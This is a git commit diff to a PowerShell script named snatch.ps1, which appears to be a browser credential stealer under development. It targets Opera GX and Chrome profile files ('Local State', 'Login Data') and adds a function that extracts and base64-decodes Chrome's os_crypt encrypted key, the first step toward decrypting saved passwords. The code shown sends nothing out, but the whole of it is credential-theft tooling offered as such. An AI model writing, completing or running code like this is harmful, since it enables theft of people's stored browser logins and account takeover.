5ec361f05687b9fcc4dba5b6976a3115471a5e7e
ApenJulius <34554076+ApenJulius@users.noreply.github.com>
2023-11-11 20:53:19 +0100

    Python ver was so much easier damn

--- snatch.ps1
+++ snatch.ps1
@@ -1,12 +1,21 @@
 # Specify the path to the Local State file
 $localStateFilePathOpera = "$env:APPDATA\Opera Software\Opera GX Stable\Local State"
 $loginDataFilePathOpera = "$env:APPDATA\Opera Software\Opera GX Stable\Login Data"
+$CHROME_PATH_LOCAL_STATE = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
+$CHROME_PATH = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
+
+
+
 
 function Get-Key {
+    Param(
+        [Parameter(Mandatory = $true)]
+        [string]$path
+        )
     # Check if the file exists
-    if (Test-Path -Path $localStateFilePathOpera) {
+    if (Test-Path -Path $path) {
         # Read the content of the Local State file
-        $content = Get-Content -Path $localStateFilePathOpera -Raw
+        $content = Get-Content -Path $path -Raw
 
         # Convert JSON content to PowerShell object
         $jsonObject = $content | ConvertFrom-Json
@@ -25,15 +34,27 @@ function Get-Key {
     }
 }
 
-$content2 = Get-Content -Path $loginDataFilePathOpera -Raw
-$key = Get-Key
-Write-Output $key
 
-# Decode the Base64 string to bytes
-$decodedBytes = [System.Convert]::FromBase64String($key)
-
-# Convert the bytes to UTF-8 string
-$utf8String = [System.Text.Encoding]::UTF8.GetString($decodedBytes)
-
-# Output or use the UTF-8 string as needed
-Write-Output $utf8String
+function Get-SecretKey {
+    Param(
+        [Parameter(Mandatory = $true)]
+        [string]$path
+        )
+    try {
+        # (1) Get secretkey from chrome local state
+        $localState = Get-Content -Path $path -Raw | ConvertFrom-Json
+        Write-Output $localState.os_crypt.encrypted_key
+        $secretKey = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key)
+        # Remove suffix DPAPI
+        $secretKey = $secretKey[5..($secretKey.Length - 1)]
+        $secretKey = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR((ConvertTo-SecureString -AsPlainText -Force -String ([System.Text.Encoding]::UTF8.GetString($secretKey)))))
+        Write-Output "$secretKey secret key found"
+        return $secretKey
+    }
+    catch {
+        Write-Output $_.Exception.Message
+        Write-Output "[ERR] Chrome secretkey cannot be found"
+        return $null
+    }
+}
+Get-SecretKey -path $CHROME_PATH_LOCAL_STATE
